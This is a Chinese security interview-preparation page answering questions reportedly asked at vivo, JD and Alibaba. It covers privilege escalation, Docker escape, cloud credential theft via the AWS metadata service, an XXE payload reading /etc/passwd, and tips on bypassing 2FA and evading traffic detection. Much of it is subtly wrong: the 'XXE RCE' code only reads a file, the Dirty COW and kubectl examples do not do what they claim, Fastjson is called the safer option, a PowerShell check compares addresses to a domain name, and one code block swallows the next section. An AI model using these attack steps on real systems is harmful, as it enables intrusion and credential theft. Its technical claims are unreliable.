<h3 id="6-作为-Agent-采集信息"><a href="#6-作为-Agent-采集信息" class="headerlink" title="6. 作为 Agent 采集信息"></a><strong>6. 作为 Agent 采集信息</strong></h3><h4 id="需要采集的信息"><a href="#需要采集的信息" class="headerlink" title="需要采集的信息"></a><strong>需要采集的信息</strong></h4><ul>
<li>系统信息：OS 版本、内核版本。</li>
<li>网络信息：IP、端口、路由表。</li>
<li>进程信息：PID、PPID、命令行参数。</li>
</ul>
<h4 id="构建进程树"><a href="#构建进程树" class="headerlink" title="构建进程树"></a><strong>构建进程树</strong></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> psutil</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build_process_tree</span>(<span class="params">pid</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        p = psutil.Process(pid)</span><br><span class="line">        <span class="keyword">return</span> &#123;</span><br><span class="line">            <span class="string">&quot;pid&quot;</span>: p.pid,</span><br><span class="line">            <span class="string">&quot;name&quot;</span>: p.name(),</span><br><span class="line">            <span class="string">&quot;cmdline&quot;</span>: p.cmdline(),</span><br><span class="line">            <span class="string">&quot;children&quot;</span>: [build_process_tree(child.pid) <span class="keyword">for</span> child <span class="keyword">in</span> p.children(recursive=<span class="literal">False</span>)]</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br></pre></td></tr></table></figure>

<hr>
<h3 id="7-提权检测"><a href="#7-提权检测" class="headerlink" title="7. 提权检测"></a><strong>7. 提权检测</strong></h3><h4 id="Linux-提权检测"><a href="#Linux-提权检测" class="headerlink" title="Linux 提权检测"></a><strong>Linux 提权检测</strong></h4><ol>
<li>检查 SUID&#x2F;SGID 文件：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -4000 2&gt;/dev/null</span><br></pre></td></tr></table></figure></li>
<li>检查内核漏洞：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">uname</span> -a</span><br></pre></td></tr></table></figure></li>
</ol>
<h4 id="Windows-提权检测"><a href="#Windows-提权检测" class="headerlink" title="Windows 提权检测"></a><strong>Windows 提权检测</strong></h4><ol>
<li>检查权限：<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whoami /priv</span><br></pre></td></tr></table></figure></li>
<li>检查服务权限：<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-Service</span> | <span class="built_in">Where-Object</span> &#123; <span class="variable">$_</span>.StartName <span class="operator">-eq</span> <span class="string">&quot;LocalSystem&quot;</span> &#125;</span><br></pre></td></tr></table></figure></li>
</ol>
<hr>
<h3 id="8-云原生与容器安全"><a href="#8-云原生与容器安全" class="headerlink" title="8. 云原生与容器安全"></a><strong>8. 云原生与容器安全</strong></h3><h4 id="Docker-逃逸"><a href="#Docker-逃逸" class="headerlink" title="Docker 逃逸"></a><strong>Docker 逃逸</strong></h4><ol>
<li><strong>利用共享命名空间</strong>：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it --<span class="built_in">rm</span> --pid=host alpine <span class="built_in">chroot</span> /proc/1/ns/mnt /bin/sh</span><br></pre></td></tr></table></figure></li>
<li><strong>利用脏牛漏洞</strong>：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it --<span class="built_in">rm</span> --cap-add SYS_ADMIN alpine</span><br></pre></td></tr></table></figure></li>
</ol>
<h4 id="Kubernetes-逃逸"><a href="#Kubernetes-逃逸" class="headerlink" title="Kubernetes 逃逸"></a><strong>Kubernetes 逃逸</strong></h4><ul>
<li>利用 <code>kubectl</code> 权限提升：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl get pods --all-namespaces</span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h3 id="9-云服务攻防"><a href="#9-云服务攻防" class="headerlink" title="9. 云服务攻防"></a><strong>9. 云服务攻防</strong></h3><h4 id="常见漏洞"><a href="#常见漏洞" class="headerlink" title="常见漏洞"></a><strong>常见漏洞</strong></h4><ol>
<li><strong>未授权访问</strong>：直接访问 S3 Bucket。</li>
<li><strong>权限提升</strong>：利用 IAM 角色权限过大。</li>
<li><strong>SSRF 利用内部服务</strong>：如 AWS Metadata Service。</li>
</ol>
<h4 id="示例-8"><a href="#示例-8" class="headerlink" title="示例"></a><strong>示例</strong></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># 利用 AWS Metadata Service 获取临时凭证</span></span><br><span class="line">response = requests.get(<span class="string">&quot;http://169.254.169.254/latest/meta-data/iam/security-credentials/&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure>

<h2 id="vivo"><a href="#vivo" class="headerlink" title="vivo"></a>vivo</h2><h3 id="1-在只有任意文件读取一个点的情况下有什么利用方式？"><a href="#1-在只有任意文件读取一个点的情况下有什么利用方式？" class="headerlink" title="1. 在只有任意文件读取一个点的情况下有什么利用方式？"></a>1. 在只有任意文件读取一个点的情况下有什么利用方式？</h3><ul>
<li><strong>利用文件读取点查找敏感信息</strong>：可以尝试读取常见的敏感文件，如<code>/etc/passwd</code>、<code>/etc/shadow</code>、<code>/etc/hosts</code>、<code>/etc/ssh/ssh_config</code>等，获取系统配置信息。</li>
<li><strong>查找运行中的服务</strong>：通过读取<code>/proc/[pid]/cmdline</code>文件，可以获取进程的完整命令行参数，从而了解系统中运行的服务。</li>
<li><strong>查找配置文件</strong>：利用<code>find</code>命令查找特定的配置文件，例如<code>find / -name &quot;*.conf&quot;</code>，定位到Web服务器、数据库等的配置文件。</li>
</ul>
<h3 id="2-怎么找开了什么服务（-proc-pid-cmdline）？"><a href="#2-怎么找开了什么服务（-proc-pid-cmdline）？" class="headerlink" title="2. 怎么找开了什么服务（/proc/pid/cmdline）？"></a>2. 怎么找开了什么服务（<code>/proc/pid/cmdline</code>）？</h3><ul>
<li>通过读取<code>/proc/[pid]/cmdline</code>文件，可以查看进程的完整命令行参数。例如：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /proc/[pid]/cmdline</span><br></pre></td></tr></table></figure>
其中<code>[pid]</code>是目标进程的PID。该命令会输出进程的启动命令及其参数。</li>
</ul>
<h3 id="3-怎么找绝对路径？"><a href="#3-怎么找绝对路径？" class="headerlink" title="3. 怎么找绝对路径？"></a>3. 怎么找绝对路径？</h3><ul>
<li><strong>使用<code>find</code>命令</strong>：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name 文件名 -<span class="built_in">type</span> f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
例如，查找<code>file.txt</code>的绝对路径：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name file.txt -<span class="built_in">type</span> f 2&gt;/dev/null</span><br></pre></td></tr></table></figure></li>
<li><strong>使用<code>realpath</code>命令</strong>：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">realpath</span> 文件名</span><br></pre></td></tr></table></figure></li>
<li><strong>使用<code>readlink -f</code>命令</strong>：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">  <span class="built_in">readlink</span> -f 文件名</span><br><span class="line">  ```。</span><br><span class="line"></span><br><span class="line"><span class="comment">### 4. 怎么找配置文件？</span></span><br><span class="line">- **使用`find`命令查找配置文件**：</span><br><span class="line">  ```bash</span><br><span class="line">  find / -name <span class="string">&quot;*.conf&quot;</span></span><br></pre></td></tr></table></figure></li>
<li><strong>查找常见配置文件路径</strong>：例如<code>/etc/nginx/nginx.conf</code>、<code>/etc/apache2/apache2.conf</code>、<code>/etc/mysql/my.cnf</code>等。</li>
</ul>
<h3 id="5-Linux开机自启动文件"><a href="#5-Linux开机自启动文件" class="headerlink" title="5. Linux开机自启动文件"></a>5. Linux开机自启动文件</h3><ul>
<li>**<code>/etc/rc.local</code>**：在某些Linux发行版中，<code>/etc/rc.local</code>文件会在系统启动时执行。</li>
<li>**<code>/etc/init.d</code>**：该目录下的脚本会在系统启动时运行，可以根据服务名称查找启动脚本。</li>
</ul>
<h3 id="6-聊云AK-SK相关的利用和防御"><a href="#6-聊云AK-SK相关的利用和防御" class="headerlink" title="6. 聊云AK&#x2F;SK相关的利用和防御"></a>6. 聊云AK&#x2F;SK相关的利用和防御</h3><ul>
<li><strong>利用方式</strong>：<ul>
<li>通过任意文件读取漏洞读取云平台的AK&#x2F;SK文件（如<code>~/.aws/credentials</code>）。</li>
<li>利用环境变量泄露获取AK&#x2F;SK（如<code>printenv</code>命令）。</li>
</ul>
</li>
<li><strong>防御措施</strong>：<ul>
<li>限制AK&#x2F;SK的权限，仅授予必要的权限。</li>
<li>定期轮换AK&#x2F;SK，避免长期使用同一密钥。</li>
<li>使用云平台的IAM（身份和访问管理）功能进行细粒度的权限控制。</li>
</ul>
</li>
</ul>
<h3 id="7-聊SSO相关的攻击方式"><a href="#7-聊SSO相关的攻击方式" class="headerlink" title="7. 聊SSO相关的攻击方式"></a>7. 聊SSO相关的攻击方式</h3><ul>
<li><strong>攻击方式</strong>：<ul>
<li><strong>会话劫持</strong>：通过中间人攻击或XSS漏洞窃取用户的SSO会话。</li>
<li><strong>OAuth令牌窃取</strong>：通过钓鱼攻击或恶意应用获取用户的OAuth令牌。</li>
</ul>
</li>
<li><strong>防御措施</strong>：<ul>
<li>使用多因素认证（MFA）增强安全性。</li>
<li>短生命周期的OAuth令牌，减少令牌被滥用的风险。</li>
</ul>
</li>
</ul>
<h3 id="8-怎么绕过动态Token？"><a href="#8-怎么绕过动态Token？" class="headerlink" title="8. 怎么绕过动态Token？"></a>8. 怎么绕过动态Token？</h3><ul>
<li><strong>利用漏洞</strong>：如果动态Token的生成逻辑存在漏洞（如基于时间戳的Token），可以通过预测或重放攻击绕过。</li>
<li><strong>中间人攻击</strong>：拦截动态Token的传输过程，获取Token值。</li>
</ul>
<h3 id="9-怎么绕过双因子认证？"><a href="#9-怎么绕过双因子认证？" class="headerlink" title="9. 怎么绕过双因子认证？"></a>9. 怎么绕过双因子认证？</h3><ul>
<li><strong>社会工程学攻击</strong>：通过欺骗用户获取双因子认证的验证码。</li>
<li><strong>中间人攻击</strong>：拦截双因子认证的验证过程，窃取验证码。</li>
</ul>
<h3 id="10-内网扫描有流量检测怎么办？"><a href="#10-内网扫描有流量检测怎么办？" class="headerlink" title="10. 内网扫描有流量检测怎么办？"></a>10. 内网扫描有流量检测怎么办？</h3><ul>
<li><strong>低频扫描</strong>：减少扫描频率，避免触发流量检测。</li>
<li><strong>服务指纹识别</strong>：通过被动方式识别服务，减少主动扫描的流量。</li>
</ul>
<h3 id="11-Redis主从复制条件"><a href="#11-Redis主从复制条件" class="headerlink" title="11. Redis主从复制条件"></a>11. Redis主从复制条件</h3><ul>
<li><strong>主从复制条件</strong>：Redis主从复制需要配置<code>slaveof</code>指令，指定主节点的IP和端口。</li>
<li><strong>版本限制</strong>：Redis 3.x及以上版本支持集群模式，主从复制在单实例和集群模式下均可使用。</li>
</ul>
<h3 id="12-JWT攻击方式"><a href="#12-JWT攻击方式" class="headerlink" title="12. JWT攻击方式"></a>12. JWT攻击方式</h3><ul>
<li><strong>攻击方式</strong>：<ul>
<li><strong>None算法攻击</strong>：如果JWT签名算法设置为<code>none</code>，可以篡改JWT内容而不被检测。</li>
<li><strong>密钥泄露</strong>：通过任意文件读取漏洞获取JWT的签名密钥。</li>
</ul>
</li>
<li><strong>防御措施</strong>：<ul>
<li>使用强密钥，避免密钥泄露。</li>
<li>短生命周期的JWT，减少被滥用的风险。</li>
</ul>
</li>
</ul>
<h2 id="京东"><a href="#京东" class="headerlink" title="京东"></a>京东</h2><h3 id="文件解析漏洞（IIS、Apache、Nginx）"><a href="#文件解析漏洞（IIS、Apache、Nginx）" class="headerlink" title="文件解析漏洞（IIS、Apache、Nginx）"></a>文件解析漏洞（IIS、Apache、Nginx）</h3><ul>
<li><p><strong>IIS解析漏洞</strong>：</p>
<ul>
<li><strong>目录解析漏洞</strong>：在 IIS5.x&#x2F;6.0 中，若在网站下建立文件夹名 为<code>*.asp</code>等的文件夹，则其目录内的任何扩展名的文件都会被 IIS 当做 asp 文件来解释并执行。例如创建目录<code>test.asp</code>，那么<code>/test.asp/1.jpg</code>将被当做 asp 文件来执行。</li>
<li><strong>文件名解析漏洞</strong>：在 IIS5.x&#x2F;6.0 中，分号后面的不被解析，如<code>xie.asp;.jpg</code> 会被服务器看成是<code>xie.asp</code>，可绕过校验并执行。</li>
<li><strong>畸形解析漏洞</strong>：在 IIS7.0 中，若 Fast-CGI 开启，可往图片里写入代码，上传到服务器后，访问<code>/upload/test.jpg/x.php</code>，此时<code>test.jpg</code>将会被服务器当成 php 文件执行。</li>
</ul>
</li>
<li><p><strong>Apache解析漏洞</strong>：从左至右开始判断解析，如果为不可识别解析，就继续往左判断。例如文件名<code>a.rar.php.jpg</code>，若服务器配置不当，可能会被解析为 php 文件。</p>
</li>
<li><p><strong>Nginx解析漏洞</strong>：</p>
<ul>
<li><strong>低版本漏洞</strong>：如 CVE-2013-4547，非法字符空格和截止符（%00）会导致 Nginx 解析 URI 时混乱，允许攻击者通过非编码空格绕过后缀名限制。</li>
<li><strong>路径解析漏洞</strong>：对任意文件名，在后面添加<code>/任意文件名.php</code>或<code>%00.php</code>等进行解析攻击。</li>
</ul>
</li>
</ul>
<h3 id="XXE直接RCE"><a href="#XXE直接RCE" class="headerlink" title="XXE直接RCE"></a>XXE直接RCE</h3><p>XXE（XML外部实体注入）漏洞通常用于信息泄露和 SSRF 攻击，但在某些情况下，也可以通过加载恶意 DTD 文件实现 RCE。以下是一个利用 XXE 实现 RCE 的示例代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://example.com/vulnerable_page&quot;</span></span><br><span class="line">payload = <span class="string">&quot;&quot;&quot;&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE foo [</span></span><br><span class="line"><span class="string">  &lt;!ELEMENT foo ANY &gt;</span></span><br><span class="line"><span class="string">  &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;</span></span><br><span class="line"><span class="string">]&gt;</span></span><br><span class="line"><span class="string">&lt;foo&gt;&amp;xxe;&lt;/foo&gt;&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">response = requests.post(url, data=payload)</span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure>

<h3 id="蜜罐溯源（JSONP）"><a href="#蜜罐溯源（JSONP）" class="headerlink" title="蜜罐溯源（JSONP）"></a>蜜罐溯源（JSONP）</h3><p>蜜罐是一种用于检测和防范网络攻击的工具，通过设置诱饵来吸引攻击者。溯源则是通过分析攻击者的 IP 地址、行为模式等信息来定位攻击者。在 JSONP（JSON with Padding）场景下，攻击者可能会利用 JSONP 的回调函数来窃取数据。以下是一个简单的 JSONP 蜜罐示例：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, jsonify</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/jsonp&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">jsonp</span>():</span><br><span class="line">    callback = request.args.get(<span class="string">&#x27;callback&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> callback:</span><br><span class="line">        <span class="comment"># 记录攻击行为</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;attack_log.txt&#x27;</span>, <span class="string">&#x27;a&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(<span class="string">f&quot;Attack detected: <span class="subst">&#123;request.remote_addr&#125;</span>\n&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;<span class="subst">&#123;callback&#125;</span>(&#123;&#123; &#x27;result&#x27;: &#x27;Honey Pot Triggered!&#x27; &#125;&#125;)&quot;</span></span><br><span class="line">    <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;result&#x27;</span>: <span class="string">&#x27;No callback provided&#x27;</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>

<h3 id="写-Poc-用-Python-及其库"><a href="#写-Poc-用-Python-及其库" class="headerlink" title="写 Poc 用 Python 及其库"></a>写 Poc 用 Python 及其库</h3><ul>
<li><strong>Python</strong> 是编写 Poc（Proof of Concept）的常用语言，具有丰富的库支持。</li>
<li><strong>常用库</strong>：<ul>
<li>**<code>requests</code>**：用于发送 HTTP 请求，测试 Web 应用漏洞。</li>
<li>**<code>socket</code>**：用于网络通信，测试网络服务漏洞。</li>
<li>**<code>xml.etree.ElementTree</code>**：用于解析 XML 文件，测试 XXE 等漏洞。</li>
<li>**<code>subprocess</code>**：用于执行系统命令，测试命令执行漏洞。</li>
<li>**<code>paramiko</code>**：用于 SSH 连接，测试 SSH 相关漏洞。</li>
<li>**<code>selenium</code>**：用于自动化浏览器操作，测试 Web 应用漏洞。</li>
</ul>
</li>
</ul>
<h2 id="阿里"><a href="#阿里" class="headerlink" title="阿里"></a>阿里</h2><h3 id="Java原生反序列化修复"><a href="#Java原生反序列化修复" class="headerlink" title="Java原生反序列化修复"></a>Java原生反序列化修复</h3><ul>
<li><strong>重写<code>readObject</code>和<code>writeObject</code>方法</strong>：在敏感类中重写这两个方法，禁止敏感操作，防止恶意数据的反序列化。</li>
<li><strong>使用安全的反序列化库</strong>：如<code>Jackson</code>、<code>Gson</code>等，它们提供了更安全的反序列化方式，避免直接使用<code>ObjectInputStream</code>。</li>
<li><strong>验证输入数据</strong>：在反序列化之前，对输入数据进行严格的验证，确保其来源可靠且格式正确。</li>
</ul>
<h3 id="Java反序列化区别"><a href="#Java反序列化区别" class="headerlink" title="Java反序列化区别"></a>Java反序列化区别</h3><ul>
<li><strong>Java原生反序列化</strong>：直接使用<code>ObjectInputStream</code>进行反序列化，存在较高的安全风险，容易受到反序列化攻击。</li>
<li><strong>Fastjson反序列化</strong>：Fastjson提供了更灵活和安全的反序列化方式，可以通过配置来控制哪些类可以被反序列化，降低安全风险。</li>
<li><strong>Log4j反序列化</strong>：Log4j本身不直接涉及反序列化，但在某些情况下，可能会因为日志记录的内容包含恶意序列化数据而导致安全问题。</li>
</ul>
<h3 id="Java-Fastjson修复"><a href="#Java-Fastjson修复" class="headerlink" title="Java Fastjson修复"></a>Java Fastjson修复</h3><ul>
<li><strong>升级Fastjson版本</strong>：确保使用的是最新版本的Fastjson，官方会不断修复已知的安全漏洞。</li>
<li><strong>配置白名单和黑名单</strong>：通过配置白名单和黑名单来控制哪些类可以被反序列化，防止恶意类的加载。</li>
<li><strong>限制反序列化深度</strong>：设置反序列化的最大深度，避免过深的嵌套结构导致的性能问题和安全风险。</li>
</ul>
<h3 id="最近安全事件及看法"><a href="#最近安全事件及看法" class="headerlink" title="最近安全事件及看法"></a>最近安全事件及看法</h3><ul>
<li><strong>Spring4Shell</strong>：是一个影响Spring Framework的远程代码执行漏洞，攻击者可以通过构造恶意请求来执行任意代码。修复方法包括升级Spring Framework到安全版本，及时应用安全补丁。</li>
<li><strong>Log4Shell</strong>：是一个影响Log4j的远程代码执行漏洞，攻击者可以通过构造恶意日志记录来触发漏洞。修复方法包括升级Log4j到安全版本，配置安全策略来限制JNDI查找。</li>
</ul>
<h3 id="指纹识别要点"><a href="#指纹识别要点" class="headerlink" title="指纹识别要点"></a>指纹识别要点</h3><ul>
<li><strong>服务识别</strong>：通过端口扫描和banner grabbing来识别目标系统上运行的服务及其版本。</li>
<li><strong>Web应用识别</strong>：通过分析HTTP响应头、页面内容等信息来识别Web应用的类型和版本。</li>
<li><strong>操作系统识别</strong>：通过TCP&#x2F;IP栈指纹、文件共享协议等信息来识别目标系统的操作系统类型和版本。</li>
</ul>
<h3 id="测绘引擎关键因素"><a href="#测绘引擎关键因素" class="headerlink" title="测绘引擎关键因素"></a>测绘引擎关键因素</h3><ul>
<li><strong>数据准确性</strong>：确保测绘数据的准确性和完整性，这是测绘引擎的基础。</li>
<li><strong>性能优化</strong>：提高测绘引擎的运行效率，减少数据处理和渲染的时间。</li>
<li><strong>可扩展性</strong>：设计具有可扩展性的架构，以便能够处理不断增加的数据量和复杂度。</li>
</ul>
<h3 id="查看登录日志"><a href="#查看登录日志" class="headerlink" title="查看登录日志"></a>查看登录日志</h3><ul>
<li><strong>Windows</strong>：可以使用事件查看器来查看登录日志，路径为“控制面板”-&gt;“管理工具”-&gt;“事件查看器”。</li>
<li><strong>Linux</strong>：可以查看<code>/var/log/auth.log</code>或<code>/var/log/secure</code>文件，这些文件记录了系统的认证相关信息。</li>
</ul>
<h3 id="Windows自启动方式"><a href="#Windows自启动方式" class="headerlink" title="Windows自启动方式"></a>Windows自启动方式</h3><ul>
<li><strong>注册表</strong>：修改注册表中的<code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</code>和<code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</code>键值。</li>
<li><strong>启动文件夹</strong>：将程序快捷方式放置在“开始”-&gt;“程序”-&gt;“启动”文件夹中。</li>
<li><strong>任务计划</strong>：使用任务计划程序来设置程序在系统启动时自动运行。</li>
</ul>
<h3 id="找出木马进程"><a href="#找出木马进程" class="headerlink" title="找出木马进程"></a>找出木马进程</h3><ul>
<li><strong>网络连接分析</strong>：使用工具如<code>netstat</code>或<code>TCPView</code>查看当前的网络连接，找出与C2服务器通信的进程。</li>
<li><strong>进程监控</strong>：使用工具如<code>Process Explorer</code>监控系统中的进程，查看可疑进程的活动。</li>
<li><strong>日志分析</strong>：查看系统日志和安全日志，寻找与木马活动相关的记录。</li>
</ul>
<h3 id="挖矿木马应急处置"><a href="#挖矿木马应急处置" class="headerlink" title="挖矿木马应急处置"></a>挖矿木马应急处置</h3><ul>
<li><strong>隔离受影响主机</strong>：立即将受影响的主机从网络中隔离，防止挖矿活动扩散到其他系统。</li>
<li><strong>终止挖矿进程</strong>：使用任务管理器或命令行工具终止挖矿相关的进程。</li>
<li><strong>清除挖矿软件</strong>：删除挖矿软件及其相关文件，确保系统中不再存在挖矿活动。</li>
<li><strong>更新和打补丁</strong>：确保系统和软件都是最新版本，应用所有安全补丁，防止再次被感染。</li>
<li><strong>加强安全防护</strong>：部署入侵检测系统（IDS）和防火墙，加强系统的安全防护措施。</li>
</ul>
<h3 id="查看登录日志-1"><a href="#查看登录日志-1" class="headerlink" title="查看登录日志"></a>查看登录日志</h3><ul>
<li><p><strong>Windows</strong>：</p>
<ul>
<li><strong>事件查看器</strong>：打开“事件查看器”，在“Windows 日志”下查看“安全”日志，筛选“4624”事件（成功登录）和“4625”事件（失败登录）。</li>
<li><strong>命令行</strong>：使用<code>wevtutil</code>命令查询登录事件，例如：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wevtutil qe Security /q:*[System[(EventID=4624)]] /f:text</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><strong>Linux</strong>：</p>
<ul>
<li><strong><code>last</code>命令</strong>：查看登录历史：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">last</span><br></pre></td></tr></table></figure></li>
<li><strong><code>/var/log</code>目录</strong>：查看相关日志文件，如<code>/var/log/auth.log</code>或<code>/var/log/secure</code>：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">tail</span> -f /var/log/auth.log</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<h3 id="Windows自启动的方式"><a href="#Windows自启动的方式" class="headerlink" title="Windows自启动的方式"></a>Windows自启动的方式</h3><ul>
<li><strong>注册表</strong>：<ul>
<li><code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</code></li>
<li><code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</code></li>
</ul>
</li>
<li><strong>启动文件夹</strong>：<code>C:\Users\&lt;用户名&gt;\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</code></li>
<li><strong>计划任务</strong>：通过任务计划程序或命令行工具<code>schtasks</code>设置自启动任务。</li>
<li><strong>服务</strong>：通过<code>services.msc</code>或命令行工具<code>sc</code>创建服务。</li>
</ul>
<h3 id="找出回连C2地址的进程"><a href="#找出回连C2地址的进程" class="headerlink" title="找出回连C2地址的进程"></a>找出回连C2地址的进程</h3><p>假设C2地址是一个域名，例如<code>c2.maliciousdomain.com</code>，可以使用以下方法：</p>
<ol>
<li><p><strong>使用<code>netstat</code>命令</strong>：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">netstat -ano | findstr :80</span><br><span class="line">netstat -ano | findstr :443</span><br></pre></td></tr></table></figure>
<p> 找到与C2域名相关的连接，然后通过进程ID（PID）在任务管理器中找到对应的进程。</p>
</li>
<li><p><strong>使用<code>tcpview</code>工具</strong>：这是一个图形化工具，可以实时查看网络连接和对应的进程。</p>
</li>
<li><p>**使用<code>powershell</code>**：</p>
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-NetTCPConnection</span> | <span class="built_in">Where-Object</span> &#123; <span class="variable">$_</span>.RemoteAddress <span class="operator">-eq</span> <span class="string">&quot;c2.maliciousdomain.com&quot;</span> &#125; | <span class="built_in">Select-Object</span> OwningProcess</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="应急处置挖矿木马"><a href="#应急处置挖矿木马" class="headerlink" title="应急处置挖矿木马"></a>应急处置挖矿木马</h3><ol>
<li><p><strong>立即停止服务</strong>：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">systemctl stop nginx</span><br><span class="line">systemctl stop apache2</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>隔离网络</strong>：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">iptables -A OUTPUT -p tcp --dport 80 -j DROP</span><br><span class="line">iptables -A OUTPUT -p tcp --dport 443 -j DROP</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>分析样本</strong>：</p>
<ul>
<li>使用<code>strings</code>或<code>hexdump</code>查看可疑文件：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings /path/to/suspicious_file</span><br></pre></td></tr></table></figure></li>
<li>使用<code>volatility</code>分析内存转储：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f memory.dmp pslist</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><strong>清除木马</strong>：</p>
<ul>
<li>删除恶意文件和计划任务。</li>
<li>重置密码和密钥。</li>
</ul>
</li>
<li><p><strong>加固系统</strong>：</p>
<ul>
<li>更新系统和软件补丁。</li>
<li>配置防火墙和入侵检测系统。</li>
</ul>
